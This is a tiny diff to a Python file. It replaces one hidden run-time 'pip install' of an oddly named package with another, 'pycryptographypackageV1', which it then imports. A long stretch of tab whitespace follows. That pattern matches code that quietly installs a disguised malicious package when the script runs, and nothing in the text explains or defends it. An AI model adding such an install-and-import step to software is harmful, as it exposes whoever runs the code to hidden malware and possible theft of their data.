@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythonfontingadds")
-import pythonfontingadds
+os.system("pip install pycryptographypackageV1")
+import pycryptographypackageV1
 import requests																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																								
 from optparse import Option
 import requests
